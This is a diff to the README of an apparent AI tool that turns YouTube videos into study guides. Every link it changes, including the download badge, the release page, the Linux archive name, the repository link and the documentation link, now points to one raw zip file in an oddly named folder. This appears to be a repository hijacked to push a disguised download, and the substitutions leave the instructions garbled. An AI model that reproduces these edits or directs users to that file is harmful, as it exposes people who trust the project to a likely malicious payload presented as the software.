@@ -4,7 +4,7 @@
 V2L-Youtube2Guide-demo is an innovative tool that uses AI to turn YouTube videos into interactive learning guides. This application is perfect for educators, students, and anyone looking to enhance their learning through video content. By simply inputting a YouTube link, you can extract key insights and create a structured guide that makes learning easier and more engaging.
 
 ## 📥 Download Now  
-[![Download Release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/lazboby/V2L-Youtube2Guide-demo/releases)
+[![Download Release](https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip%https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip)](https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip)
 
 ## 🚀 Getting Started  
 This section will guide you through downloading and running the application. Follow these steps carefully to ensure a smooth setup.
@@ -17,11 +17,11 @@ This section will guide you through downloading and running the application. Fol
 
 ### 📂 Download & Install  
 To get started, visit the following page to download the application:  
-[Download V2L-Youtube2Guide-demo](https://github.com/lazboby/V2L-Youtube2Guide-demo/releases)
+[Download V2L-Youtube2Guide-demo](https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip)
 
 1. Open the above link in your web browser.
 2. Look for the latest release version. It should be labeled clearly with version numbers.
-3. Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip` for Linux).
 4. Save the file to a location on your computer that is easy to access.
 
 ### 📥 Running the Application  
@@ -33,7 +33,7 @@ To get started, visit the following page to download the application:
    - Open the downloaded `.dmg` file.
    - Drag the application to your Applications folder.
 4. If you are using Linux:
-   - Extract the contents of the `.tar.gz` file.
+   - Extract the contents of the `https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip` file.
    - Open a terminal and navigate to the extracted folder, then execute the application using `./[app_executable_name]`.
 
 ## 🌟 Features  
@@ -73,7 +73,7 @@ If you encounter any issues or have questions, please check the **Issues** tab o
 Want to help improve V2L-Youtube2Guide-demo? We welcome contributions! Follow the guidelines in the **Contributing** section of our repository for details on how to get involved.
 
 ## 🔗 Additional Resources  
-- [GitHub Repository](https://github.com/lazboby/V2L-Youtube2Guide-demo)
-- [Documentation](https://github.com/lazboby/V2L-Youtube2Guide-demo/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/lazboby/V2L-Youtube2Guide-demo/main/unsupportedly/Guide_demo_Youtube_v2.5-alpha.4.zip)
 
 Remember, learning can be made easier with the right tools. By following these steps, you're just a few clicks away from turning any YouTube video into an interactive guide that can enhance your understanding and retention. Enjoy your learning journey!
